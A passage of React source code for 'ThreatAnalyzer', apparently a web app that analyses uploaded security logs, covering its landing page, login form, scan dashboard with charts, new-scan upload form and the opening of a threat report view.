                  borderTopRightRadius: msg.role==='user' ? 2 : 10,
                  borderTopLeftRadius: msg.role==='user' ? 10 : 2 }}>
                  {msg.content || (msg.streaming && <span style={{ color:'#aaa' }}>Thinking…</span>)}
                  {msg.streaming && msg.content && <span style={{ color:COLORS.primary, marginLeft:2 }}>▋</span>}
                </div>
              </div>
            ))}
            {!streaming && messages.length>0 && (
              <div style={{ display:'flex', flexWrap:'wrap', gap:6, paddingTop:4 }}>
                {QUICK.slice(0,3).map(q=>(
                  <button key={q} onClick={()=>send(q)}
                    style={{ padding:'4px 10px', borderRadius:99, fontSize:11, cursor:'pointer',
                      background:'transparent', border:`0.5px solid ${COLORS.border}`, color:'#888',
                      transition:'all 0.15s' }}>
                    {q}
                  </button>
                ))}
              </div>
            )}
            <div ref={bottomRef} />
          </>
        )}
      </div>
      <div style={{ padding:'12px 16px', borderTop:`0.5px solid ${COLORS.border}`, display:'flex', gap:8 }}>
        <input value={input} onChange={e=>setInput(e.target.value)}
          onKeyDown={e=>{ if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();send();}}}
          disabled={streaming}
          style={{ flex:1, padding:'8px 14px', borderRadius:8, border:`0.5px solid ${COLORS.border}`,
            fontSize:13, outline:'none', color:'#1a1a2e', background:'#fff',
            opacity: streaming ? 0.6 : 1 }}
          placeholder="Ask about this incident… (Enter to send)" />
        <button onClick={()=>send()} disabled={!input.trim()||streaming}
          style={{ ...btnPrimary, padding:'8px 16px', fontSize:13, opacity: (!input.trim()||streaming)?0.5:1 }}>
          {streaming ? '…' : '→'}
        </button>
      </div>
    </div>
  );
}

// ── Button styles ─────────────────────────────────────────────
const btnPrimary = {
  background: COLORS.primary, color:'#fff', border:'none',
  padding:'10px 24px', borderRadius:8, fontSize:14, fontWeight:500, cursor:'pointer',
};
const btnOutline = {
  background: 'transparent', color:'#1a1a2e', border:`0.5px solid ${COLORS.border}`,
  padding:'10px 24px', borderRadius:8, fontSize:14, cursor:'pointer',
};
const btnSecondary = {
  background: '#F5F7FA', color:'#555', border:`0.5px solid ${COLORS.border}`,
  padding:'10px 24px', borderRadius:8, fontSize:14, cursor:'pointer',
};

// ══════════════════════════════════════════════════════════════
// SITE HEADER
// ══════════════════════════════════════════════════════════════
function Header({ user, onNewScan, onAccount, onHome }) {
  return (
    <header style={{ background:'#fff', borderBottom:`0.5px solid ${COLORS.border}`, position:'sticky', top:0, zIndex:100 }}>
      <div style={{ maxWidth:960, margin:'0 auto', padding:'0 24px', height:56, display:'flex', alignItems:'center', justifyContent:'space-between' }}>
        <button onClick={onHome} style={{ display:'flex', alignItems:'center', gap:10, background:'none', border:'none', cursor:'pointer', padding:0 }}>
          <ShieldLogo size={28} />
          <span style={{ fontSize:15, fontWeight:500, color:'#1a1a2e' }}>ThreatAnalyzer</span>
        </button>
        <div style={{ display:'flex', alignItems:'center', gap:24 }}>
          {user ? (
            <>
              <button onClick={onAccount} style={{ fontSize:14, color:'#555', background:'none', border:'none', cursor:'pointer' }}>Account</button>
              <button onClick={onNewScan} style={{ ...btnPrimary, display:'flex', alignItems:'center', gap:6, padding:'8px 18px', fontSize:14 }}>
                <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
                  <path d="M8 2v9M4 7l4 4 4-4M2 13h12" stroke="#fff" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
                Upload file
              </button>
            </>
          ) : (
            <>
              <a href="#" style={{ fontSize:14, color:'#555', textDecoration:'none' }}>Home</a>
              <a href="#" style={{ fontSize:14, color:'#555', textDecoration:'none' }}>Docs</a>
              <a href="#" style={{ fontSize:14, color:'#555', textDecoration:'none' }}>Pricing</a>
            </>
          )}
        </div>
      </div>
    </header>
  );
}

// ══════════════════════════════════════════════════════════════
// SITE FOOTER
// ══════════════════════════════════════════════════════════════
function Footer() {
  return (
    <footer style={{ background:COLORS.footer, padding:'32px 0', marginTop:'auto' }}>
      <div style={{ maxWidth:960, margin:'0 auto', padding:'0 24px', display:'flex', alignItems:'center', justifyContent:'space-between', flexWrap:'wrap', gap:16 }}>
        <div style={{ display:'flex', alignItems:'center', gap:8 }}>
          <svg width="20" height="20" viewBox="0 0 28 28" fill="none">
            <path d="M14 3L4 7v8c0 5.5 4.3 10.7 10 12 5.7-1.3 10-6.5 10-12V7L14 3z" fill="#185FA5" fillOpacity="0.4" stroke="#85B7EB" strokeWidth="1.5" />
            <path d="M10 14l3 3 5-5" stroke="#85B7EB" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
          <span style={{ fontSize:13, color:'#B5D4F4' }}>ThreatAnalyzer</span>
        </div>
        <div style={{ display:'flex', gap:24 }}>
          {['Privacy','Terms','Contact'].map(l => (
            <a key={l} href="#" style={{ fontSize:13, color:'#B5D4F4', textDecoration:'none' }}>{l}</a>
          ))}
        </div>
        <span style={{ fontSize:12, color:'#378ADD' }}>© {new Date().getFullYear()} ThreatAnalyzer. All rights reserved.</span>
      </div>
    </footer>
  );
}

// Wrap pages
function Page({ children }) {
  return (
    <div style={{ minHeight:'100vh', display:'flex', flexDirection:'column', background:'#F5F7FA' }}>
      {children}
      <Footer />
    </div>
  );
}
function Container({ children, style={} }) {
  return <div style={{ maxWidth:960, margin:'0 auto', padding:'0 24px', ...style }}>{children}</div>;
}

// ══════════════════════════════════════════════════════════════
// LANDING
// ══════════════════════════════════════════════════════════════
function Landing({ onLogin, onSignup }) {
  return (
    <Page>
      <Header user={null} onHome={()=>{}} />

      {/* Hero */}
      <div style={{ background:'#fff', padding:'64px 0 56px', position:'relative', overflow:'hidden' }}>
        <NetworkBg />
        <Container>
          <div style={{ maxWidth:560, position:'relative', zIndex:1 }}>
            <div style={{ display:'inline-flex', alignItems:'center', gap:6, fontSize:11, fontWeight:500,
              padding:'3px 10px', borderRadius:99, background:COLORS.dangerLt, color:COLORS.danger, marginBottom:16 }}>
              <span style={{ width:6, height:6, borderRadius:'50%', background:COLORS.danger }} />
              AI-powered threat detection
            </div>
            <h1 style={{ fontSize:36, fontWeight:500, lineHeight:1.2, marginBottom:16, color:'#1a1a2e' }}>
              Detect AI-generated threats instantly
            </h1>
            <p style={{ fontSize:16, color:'#666', lineHeight:1.7, marginBottom:32 }}>
              Upload a file or paste text to get a detailed risk analysis with MITRE ATT&CK mapping, IOC extraction, and actionable remediation steps.
            </p>
            <div style={{ display:'flex', gap:12, alignItems:'center', flexWrap:'wrap' }}>
              <button onClick={onSignup} style={btnPrimary}>Analyze now</button>
              <button onClick={onLogin} style={btnOutline}>Learn more</button>
            </div>
            <p style={{ fontSize:12, color:'#aaa', marginTop:12 }}>No credit card · Unlimited scans · Results in under 30s</p>
          </div>
        </Container>
      </div>

      {/* Form preview */}
      <Container style={{ padding:'40px 24px' }}>
        <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:24 }}>
          <div style={{ display:'flex', gap:12, alignItems:'flex-start' }}>
            <div style={{ flex:1 }}>
              <textarea style={{ width:'100%', height:120, resize:'vertical', fontSize:14, padding:14,
                border:`0.5px solid ${COLORS.border}`, borderRadius:8, fontFamily:'inherit',
                color:'#1a1a2e', background:'#fff', outline:'none', lineHeight:1.6, boxSizing:'border-box' }}
                placeholder="Paste your text or drag-drop a file…" />
              <div style={{ display:'flex', gap:8, marginTop:8, alignItems:'center' }}>
                <svg width="12" height="12" viewBox="0 0 16 16" fill="none">
                  <path d="M14 10v3H2v-3M8 2v8M5 5l3-3 3 3" stroke="#aaa" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
                <span style={{ fontSize:12, color:'#aaa' }}>Supports .txt, .log, .json, .csv — max 5 MB</span>
              </div>
            </div>
            <button onClick={onSignup} style={{ ...btnSecondary, display:'flex', alignItems:'center', gap:6, whiteSpace:'nowrap', flexShrink:0 }}>
              <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
                <path d="M14 10v3H2v-3M8 2v8M5 5l3-3 3 3" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
              Upload file
            </button>
          </div>
          <div style={{ marginTop:16, display:'flex', justifyContent:'flex-end' }}>
            <button onClick={onSignup} style={{ ...btnPrimary, display:'flex', alignItems:'center', gap:8 }}>
              <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
                <circle cx="8" cy="8" r="6" stroke="#fff" strokeWidth="1.5" />
                <path d="M5 8l2 2 4-4" stroke="#fff" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
              Start analysis
            </button>
          </div>
        </div>
      </Container>

      {/* Features */}
      <Container style={{ padding:'0 24px 64px' }}>
        <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fit,minmax(200px,1fr))', gap:12 }}>
          {[['🤖','AI threat chat','Ask follow-up questions in natural language'],
            ['⚔️','Model compare','Run 2 AI models side by side'],
            ['📊','Confidence scores','Every IOC has its own confidence %'],
            ['🔁','Pattern matching','Flags IOCs seen in previous scans'],
            ['📄','PDF export','Download professional reports'],
            ['🔗','Share links','Share read-only links with your team'],
          ].map(([icon,title,desc])=>(
            <div key={title} style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
              <div style={{ fontSize:22, marginBottom:10 }}>{icon}</div>
              <div style={{ fontSize:14, fontWeight:500, color:'#1a1a2e', marginBottom:4 }}>{title}</div>
              <div style={{ fontSize:13, color:'#888', lineHeight:1.5 }}>{desc}</div>
            </div>
          ))}
        </div>
      </Container>
    </Page>
  );
}

// ══════════════════════════════════════════════════════════════
// AUTH
// ══════════════════════════════════════════════════════════════
function Auth({ mode, onSuccess, onSwitch }) {
  const [email,setEmail]=useState('');const[pw,setPw]=useState('');
  const [loading,setLoading]=useState(false);const[msg,setMsg]=useState('');const[isErr,setIsErr]=useState(false);
  async function submit(e){
    e.preventDefault();setLoading(true);setMsg('');
    try{
      const res=mode==='login'?await supabase.auth.signInWithPassword({email,password:pw}):await supabase.auth.signUp({email,password:pw});
      if(res.error)throw res.error;
      if(mode==='signup'&&!res.data.session){setIsErr(false);setMsg('Check your email to confirm, then sign in.');return;}
      onSuccess(res.data.user);
    }catch(err){setIsErr(true);setMsg(err.message);}finally{setLoading(false);}
  }
  return (
    <div style={{ minHeight:'100vh', background:'#F5F7FA', display:'flex', flexDirection:'column' }}>
      <Header user={null} onHome={()=>{}} />
      <div style={{ flex:1, display:'flex', alignItems:'center', justifyContent:'center', padding:24 }}>
        <div style={{ width:'100%', maxWidth:400 }}>
          <div style={{ textAlign:'center', marginBottom:32 }}>
            <div style={{ display:'flex', justifyContent:'center', marginBottom:16 }}><ShieldLogo size={40} /></div>
            <h1 style={{ fontSize:24, fontWeight:500, color:'#1a1a2e' }}>{mode==='login'?'Welcome back':'Create account'}</h1>
            <p style={{ fontSize:14, color:'#888', marginTop:4 }}>ThreatAnalyzer — AI-powered security</p>
          </div>
          <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:24 }}>
            <form onSubmit={submit} style={{ display:'flex', flexDirection:'column', gap:16 }}>
              <div>
                <label style={{ display:'block', fontSize:12, color:'#888', marginBottom:6 }}>Email address</label>
                <input type="email" value={email} onChange={e=>setEmail(e.target.value)} required
                  style={{ width:'100%', padding:'10px 14px', borderRadius:8, border:`0.5px solid ${COLORS.border}`,
                    fontSize:14, color:'#1a1a2e', outline:'none', boxSizing:'border-box' }}
                  placeholder="you@example.com" />
              </div>
              <div>
                <label style={{ display:'block', fontSize:12, color:'#888', marginBottom:6 }}>Password</label>
                <input type="password" value={pw} onChange={e=>setPw(e.target.value)} required minLength={6}
                  style={{ width:'100%', padding:'10px 14px', borderRadius:8, border:`0.5px solid ${COLORS.border}`,
                    fontSize:14, color:'#1a1a2e', outline:'none', boxSizing:'border-box' }}
                  placeholder="••••••••" />
              </div>
              {msg && (
                <div style={{ padding:'10px 14px', borderRadius:8, fontSize:13,
                  background: isErr ? COLORS.dangerLt : COLORS.successLt,
                  color: isErr ? COLORS.danger : COLORS.success,
                  border:`0.5px solid ${isErr?COLORS.danger:COLORS.success}44` }}>{msg}</div>
              )}
              <button type="submit" disabled={loading} style={{ ...btnPrimary, width:'100%', opacity:loading?0.7:1 }}>
                {loading?'Please wait…':mode==='login'?'Sign In':'Create Account'}
              </button>
            </form>
          </div>
          <p style={{ textAlign:'center', fontSize:13, color:'#888', marginTop:16 }}>
            {mode==='login'?"Don't have an account? ":"Already have an account? "}
            <button onClick={onSwitch} style={{ background:'none', border:'none', cursor:'pointer', color:COLORS.primary, fontSize:13, fontWeight:500 }}>
              {mode==='login'?'Sign up free':'Sign in'}
            </button>
          </p>
        </div>
      </div>
      <Footer />
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// DASHBOARD
// ══════════════════════════════════════════════════════════════
function Dashboard({ user, onNewScan, onViewScan }) {
  const [scans,setScans]=useState([]);const[loading,setLoading]=useState(true);
  const [search,setSearch]=useState('');const[filterSev,setFilterSev]=useState('ALL');
  const [tab,setTab]=useState('scans');

  useEffect(()=>{apiFetch('/api/scans').then(d=>{setScans(d.scans||[]);setLoading(false);}).catch(()=>setLoading(false));},[]);

  const filtered=scans.filter(s=>{
    const ms=!search||(s.title||'').toLowerCase().includes(search.toLowerCase())||s.severity?.toLowerCase().includes(search.toLowerCase())||(s.tags||[]).some(t=>t.toLowerCase().includes(search.toLowerCase()));
    return ms&&(filterSev==='ALL'||s.severity===filterSev);
  });

  return (
    <Page>
      <Header user={user} onNewScan={onNewScan} onAccount={()=>{}} onHome={()=>{}} />
      <Container style={{ padding:'32px 24px', flex:1 }}>
        <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:24 }}>
          <div>
            <h1 style={{ fontSize:22, fontWeight:500, color:'#1a1a2e' }}>Dashboard</h1>
            <p style={{ fontSize:13, color:'#888', marginTop:2 }}>{user?.email}</p>
          </div>
          <button onClick={onNewScan} style={btnPrimary}>+ New analysis</button>
        </div>

        {/* Stats */}
        <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fit,minmax(160px,1fr))', gap:12, marginBottom:24 }}>
          {[['Total scans',scans.length],['Critical',scans.filter(s=>s.severity==='CRITICAL').length],
            ['High',scans.filter(s=>s.severity==='HIGH').length],
            ['Avg score',scans.length?Math.round(scans.reduce((a,s)=>a+(s.risk_score||0),0)/scans.length):0]
          ].map(([label,val])=>(
            <div key={label} style={{ background:'#F5F7FA', borderRadius:8, padding:16 }}>
              <p style={{ fontSize:12, color:'#888', textTransform:'uppercase', letterSpacing:'0.06em', marginBottom:4 }}>{label}</p>
              <p style={{ fontSize:24, fontWeight:500, color:'#1a1a2e' }}>{val}</p>
            </div>
          ))}
        </div>

        {/* Tabs */}
        <div style={{ display:'flex', gap:2, background:'#F5F7FA', borderRadius:8, padding:3, width:'fit-content', marginBottom:20, border:`0.5px solid ${COLORS.border}` }}>
          {[['scans','Scans'],['trends','Trends']].map(([id,label])=>(
            <button key={id} onClick={()=>setTab(id)}
              style={{ padding:'6px 20px', borderRadius:6, fontSize:13, cursor:'pointer', fontWeight:500,
                background: tab===id?'#fff':'transparent', color: tab===id?'#1a1a2e':'#888',
                border: tab===id?`0.5px solid ${COLORS.border}`:'none', transition:'all 0.15s' }}>
              {label}
            </button>
          ))}
        </div>

        {tab==='scans' && (
          <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, overflow:'hidden' }}>
            <div style={{ padding:'16px 20px', borderBottom:`0.5px solid ${COLORS.border}`, display:'flex', gap:12, flexWrap:'wrap' }}>
              <div style={{ flex:1, position:'relative', minWidth:200 }}>
                <span style={{ position:'absolute', left:10, top:'50%', transform:'translateY(-50%)', fontSize:14, color:'#aaa' }}>🔍</span>
                <input value={search} onChange={e=>setSearch(e.target.value)}
                  style={{ width:'100%', paddingLeft:32, paddingRight:12, paddingTop:8, paddingBottom:8, borderRadius:8,
                    border:`0.5px solid ${COLORS.border}`, fontSize:13, outline:'none', boxSizing:'border-box', color:'#1a1a2e' }}
                  placeholder="Search by title, tag, severity…" />
              </div>
              <select value={filterSev} onChange={e=>setFilterSev(e.target.value)}
                style={{ padding:'8px 12px', borderRadius:8, border:`0.5px solid ${COLORS.border}`, fontSize:13, color:'#555', outline:'none', background:'#fff' }}>
                {['ALL','CRITICAL','HIGH','MEDIUM','LOW'].map(s=><option key={s} value={s}>{s==='ALL'?'All severities':s}</option>)}
              </select>
            </div>
            {loading ? <p style={{ padding:48, textAlign:'center', color:'#aaa', fontSize:14 }}>Loading…</p>
            : filtered.length===0 ? (
              <div style={{ padding:48, textAlign:'center' }}>
                <div style={{ fontSize:36, marginBottom:12 }}>🔍</div>
                <p style={{ fontWeight:500, color:'#1a1a2e', marginBottom:6 }}>{scans.length===0?'No analyses yet':'No results found'}</p>
                <p style={{ fontSize:13, color:'#888', marginBottom:20 }}>{scans.length===0?'Paste a log file to get your first threat report':'Try adjusting your search or filter'}</p>
                {scans.length===0 && <button onClick={onNewScan} style={btnPrimary}>Run first analysis</button>}
              </div>
            ) : filtered.map((scan,i)=>(
              <div key={scan.id} style={{ padding:'14px 20px', borderTop:i===0?'none':`0.5px solid ${COLORS.border}`,
                display:'flex', alignItems:'center', gap:12, cursor:'pointer', transition:'background 0.15s' }}
                onMouseEnter={e=>e.currentTarget.style.background='#F5F7FA'}
                onMouseLeave={e=>e.currentTarget.style.background='#fff'}
                onClick={()=>onViewScan(scan.id)}>
                <div style={{ width:8, height:8, borderRadius:'50%', flexShrink:0, background:sevColor(scan.severity) }} />
                <div style={{ flex:1, minWidth:0 }}>
                  <div style={{ display:'flex', alignItems:'center', gap:8, marginBottom:3 }}>
                    <SevBadge level={scan.severity} />
                    <span style={{ fontWeight:500, fontSize:13, color:'#1a1a2e', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
                      {scan.title || `Risk ${scan.risk_score}/100`}
                    </span>
                  </div>
                  <div style={{ display:'flex', gap:8, alignItems:'center', flexWrap:'wrap' }}>
                    <span style={{ fontSize:12, color:'#aaa' }}>{new Date(scan.created_at).toLocaleString('en-IN',{dateStyle:'medium',timeStyle:'short'})}</span>
                    {(scan.tags||[]).slice(0,3).map(tag=>(
                      <span key={tag} style={{ fontSize:11, background:COLORS.primaryLt, color:COLORS.primary, padding:'1px 8px', borderRadius:99 }}>{tag}</span>
                    ))}
                    {scan.is_public && <span style={{ fontSize:11, background:COLORS.successLt, color:COLORS.success, padding:'1px 8px', borderRadius:99 }}>🔗 Public</span>}
                  </div>
                </div>
                <span style={{ fontSize:13, color:COLORS.primary, flexShrink:0, fontWeight:500 }}>View →</span>
              </div>
            ))}
          </div>
        )}

        {tab==='trends' && (
          <div style={{ display:'flex', flexDirection:'column', gap:16 }}>
            {scans.length < 2 ? (
              <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:48, textAlign:'center' }}>
                <div style={{ fontSize:36, marginBottom:12 }}>📊</div>
                <p style={{ fontWeight:500, color:'#1a1a2e', marginBottom:4 }}>Not enough data yet</p>
                <p style={{ fontSize:13, color:'#888' }}>Run at least 2 analyses to see trend charts</p>
              </div>
            ) : (
              <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:16 }}>
                <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
                  <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e', marginBottom:16 }}>Severity breakdown</p>
                  <ResponsiveContainer width="100%" height={180}>
                    <PieChart><Pie data={['CRITICAL','HIGH','MEDIUM','LOW'].map((s,i)=>({name:s,value:scans.filter(sc=>sc.severity===s).length})).filter(d=>d.value>0)} cx="50%" cy="50%" innerRadius={45} outerRadius={70} paddingAngle={3} dataKey="value">
                      {['CRITICAL','HIGH','MEDIUM','LOW'].map((_,i)=><Cell key={i} fill={[COLORS.danger,'#993C1D',COLORS.warning,COLORS.success][i]} />)}
                    </Pie><Tooltip contentStyle={{ borderRadius:8, fontSize:12, border:`0.5px solid ${COLORS.border}` }} /></PieChart>
                  </ResponsiveContainer>
                </div>
                <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
                  <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e', marginBottom:16 }}>Risk score trend</p>
                  <ResponsiveContainer width="100%" height={180}>
                    <LineChart data={[...scans].reverse().slice(-15).map((s,i)=>({name:`#${i+1}`,score:s.risk_score||0}))} margin={{top:5,right:10,left:-20,bottom:5}}>
                      <CartesianGrid strokeDasharray="3 3" stroke="#eee" />
                      <XAxis dataKey="name" tick={{fill:'#aaa',fontSize:10}} axisLine={false} tickLine={false} />
                      <YAxis domain={[0,100]} tick={{fill:'#aaa',fontSize:10}} axisLine={false} tickLine={false} />
                      <Tooltip contentStyle={{ borderRadius:8, fontSize:12, border:`0.5px solid ${COLORS.border}` }} />
                      <Line type="monotone" dataKey="score" stroke={COLORS.primary} strokeWidth={2} dot={{ fill:COLORS.primary, r:3 }} />
                    </LineChart>
                  </ResponsiveContainer>
                </div>
              </div>
            )}
          </div>
        )}
      </Container>
    </Page>
  );
}

// ══════════════════════════════════════════════════════════════
// NEW SCAN
// ══════════════════════════════════════════════════════════════
function NewScan({ onComplete, onBack }) {
  const [input,setInput]=useState('');const[file,setFile]=useState(null);
  const [state,setState]=useState('idle');const[error,setError]=useState('');
  const [mode,setMode]=useState('stream');
  const fileRef=useRef();

  return (
    <Page>
      <Header user={{}} onNewScan={()=>{}} onHome={onBack} />
      <Container style={{ padding:'32px 24px', flex:1 }}>
        <div style={{ marginBottom:24, display:'flex', alignItems:'center', gap:12 }}>
          <button onClick={onBack} style={{ background:'none', border:'none', cursor:'pointer', color:'#888', fontSize:14 }}>← Back</button>
          <span style={{ color:'#ddd' }}>/</span>
          <h1 style={{ fontSize:18, fontWeight:500, color:'#1a1a2e' }}>New analysis</h1>
        </div>

        {state==='streaming' ? (
          <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:24 }}>
            <StreamLoader input={input} onComplete={(r,sid)=>onComplete(r,sid)} onError={msg=>{setState('error');setError(msg);}} />
          </div>
        ) : state==='comparing' ? (
          <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:24 }}>
            <CompareRunner input={input} onBack={()=>setState('idle')} />
          </div>
        ) : (
          <div style={{ display:'flex', flexDirection:'column', gap:16 }}>
            {/* Mode selector */}
            <div style={{ display:'flex', gap:2, background:'#F5F7FA', borderRadius:8, padding:3, width:'fit-content', border:`0.5px solid ${COLORS.border}` }}>
              {[['stream','🔴 Live analysis'],['compare','⚔️ Compare models']].map(([id,label])=>(
                <button key={id} onClick={()=>setMode(id)}
                  style={{ padding:'7px 20px', borderRadius:6, fontSize:13, cursor:'pointer', fontWeight:500,
                    background:mode===id?'#fff':'transparent', color:mode===id?'#1a1a2e':'#888',
                    border:mode===id?`0.5px solid ${COLORS.border}`:'none' }}>
                  {label}
                </button>
              ))}
            </div>

            <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:24 }}>
              <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:12 }}>
                <span style={{ fontSize:14, fontWeight:500, color:'#1a1a2e' }}>Security log input</span>
                <div style={{ display:'flex', gap:12 }}>
                  <button onClick={()=>{setInput(SAMPLE);setFile(null);}} style={{ background:'none', border:'none', cursor:'pointer', fontSize:13, color:COLORS.primary }}>Load sample</button>
                  {(input||file)&&<button onClick={()=>{setInput('');setFile(null);}} style={{ background:'none', border:'none', cursor:'pointer', fontSize:13, color:'#aaa' }}>Clear</button>}
                </div>
              </div>
              <div style={{ display:'flex', gap:12 }}>
                <textarea value={input} onChange={e=>{setInput(e.target.value);setFile(null);}}
                  style={{ flex:1, height:140, resize:'vertical', fontSize:13, padding:14, lineHeight:1.6,
                    border:`0.5px solid ${COLORS.border}`, borderRadius:8, fontFamily:'monospace',
                    color:'#1a1a2e', outline:'none', boxSizing:'border-box' }}
                  placeholder={"Paste firewall logs, SIEM events, IOCs…\n\nClick 'Load sample' to see an example."} spellCheck={false} />
                <div style={{ display:'flex', flexDirection:'column', gap:8, flexShrink:0 }}>
                  <button onClick={()=>fileRef.current?.click()} style={{ ...btnSecondary, display:'flex', alignItems:'center', gap:6, whiteSpace:'nowrap', fontSize:13 }}>
                    <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
                      <path d="M14 10v3H2v-3M8 2v8M5 5l3-3 3 3" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                    Upload file
                  </button>
                  <span style={{ fontSize:11, color:'#aaa', textAlign:'center' }}>or drag & drop</span>
                </div>
              </div>
              <input ref={fileRef} type="file" accept=".txt,.log,.json,.csv" style={{ display:'none' }}
                onChange={e=>{const f=e.target.files[0];if(f){setFile(f);setInput('');}}} />

              {/* File indicator */}
              {file && (
                <div style={{ marginTop:10, display:'flex', alignItems:'center', gap:8, padding:'8px 12px', background:COLORS.successLt, borderRadius:8, border:`0.5px solid ${COLORS.success}44` }}>
                  <span style={{ fontSize:14 }}>📄</span>
                  <span style={{ fontSize:13, color:COLORS.success, fontFamily:'monospace' }}>{file.name} ({(file.size/1024).toFixed(1)} KB)</span>
                  <button onClick={()=>setFile(null)} style={{ marginLeft:'auto', background:'none', border:'none', cursor:'pointer', color:COLORS.success, fontSize:16 }}>×</button>
                </div>
              )}

              {/* Drop zone hint */}
              {!file && !input && (
                <div style={{ marginTop:12, padding:'14px', borderRadius:8, border:`1.5px dashed ${COLORS.border}`, textAlign:'center', color:'#aaa', fontSize:13 }}>
                  .txt · .log · .json · .csv — max 5 MB
                </div>
              )}

              {error && (
                <div style={{ marginTop:12, padding:'10px 14px', borderRadius:8, fontSize:13,
                  background:COLORS.dangerLt, color:COLORS.danger, border:`0.5px solid ${COLORS.danger}44` }}>{error}</div>
              )}

              <div style={{ marginTop:16, display:'flex', justifyContent:'flex-end' }}>
                <button onClick={()=>{ if(!input.trim()&&!file){setError('Please paste log data or upload a file.');return;} setError(''); setState(mode==='compare'?'comparing':'streaming'); }}
                  disabled={!input.trim()&&!file}
                  style={{ ...btnPrimary, display:'flex', alignItems:'center', gap:8, opacity:(!input.trim()&&!file)?0.5:1 }}>
                  <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
                    <circle cx="8" cy="8" r="6" stroke="#fff" strokeWidth="1.5" />
                    <path d="M5 8l2 2 4-4" stroke="#fff" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                  {mode==='compare' ? 'Compare two models' : 'Start analysis'}
                </button>
              </div>
            </div>

            <p style={{ textAlign:'center', fontSize:12, color:'#aaa' }}>Raw input is never stored · Results are private to your account</p>
          </div>
        )}
      </Container>
    </Page>
  );
}

// ══════════════════════════════════════════════════════════════
// REPORT
// ══════════════════════════════════════════════════════════════
function Report({ result, scanId, isPublic:initPub, onBack, onNewScan, onToast }) {
  const [tab, setTab] = useState('overview');
  if (!result) return null;

  const score = result.riskScore || 0;
  const tabs = [
    {id:'overview',label:'Overview'},
    {id:'timeline',label:'Timeline'},
    {id:'mitre',label:'ATT&CK'},
    {id:'iocs',label:'IOCs'},
    {id:'remediation',label:'Remediation'},
    {id:'chat',label:'AI Chat 🤖'},
  ];

  // Extract a good code snippet for the code block
  const codeLines = (result.iocs||[]).filter(i=>i.type==='Process'||i.type==='File').slice(0,3).map(i=>i.value);
  const codePills = [
    ...(result.iocs||[]).filter(i=>i.type==='IP').slice(0,1).map(i=>({label:'IOC',value:i.value,type:'danger'})),
    ...(result.iocs||[]).filter(i=>i.type==='Domain').slice(0,1).map(i=>({label:'Domain',value:i.value,type:'danger'})),
    ...(result.mitreMapping||[]).slice(0,1).map(m=>({label:'Technique',value:`${m.technique} — ${m.name}`,type:'info'})),
  ];

  return (
    <Page>
      <Header user={{}} onNewScan={onNewScan} onHome={onBack} />
      <Container style={{ padding:'32px 24px', flex:1 }}>

        {/* Breadcrumb */}
        <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:20, flexWrap:'wrap', gap:12 }}>
          <div>
            <div style={{ display:'flex', alignItems:'center', gap:10, marginBottom:4 }}>
              <button onClick={onBack} style={{ background:'none', border:'none', cursor:'pointer', color:'#888', fontSize:14 }}>← Back</button>
              <span style={{ color:'#ddd' }}>/</span>
              <span style={{ fontSize:14, color:'#888' }}>Threat report</span>
            </div>
            <div style={{ display:'flex', alignItems:'center', gap:12 }}>
              <h1 style={{ fontSize:22, fontWeight:500, color:'#1a1a2e' }}>{result.title || 'Analysis report'}</h1>
              <SevBadge level={result.severity} />
            </div>
          </div>
          <div style={{ display:'flex', gap:8, flexWrap:'wrap' }}>
            {scanId && <ShareBtn scanId={scanId} isPublic={initPub} onToast={onToast} />}
            <button onClick={()=>window.print()} style={{ ...btnSecondary, display:'flex', alignItems:'center', gap:6, fontSize:13 }}>
              <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
                <path d="M4 6V2h8v4M4 12H2V6h12v6h-2M4 10h8v4H4v-4z" stroke="currentColor" strokeWidth="1.5" strokeLinejoin="round" />
              </svg>
              Export PDF
            </button>
            <button onClick={onNewScan} style={btnPrimary}>+ New analysis</button>
          </div>
        </div>

        {/* IOC repeat banner */}
        {scanId && <IOCBanner scanId={scanId} />}

        {/* 3 threat cards */}
        <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fit,minmax(240px,1fr))', gap:16, marginBottom:16 }}>
          <ThreatCard
            title={result.title || 'Security incident'}
            score={score}
            bullets={(result.affectedSystems||[]).slice(0,4).map(s=>`${s.host} — ${s.status}`)}
          />
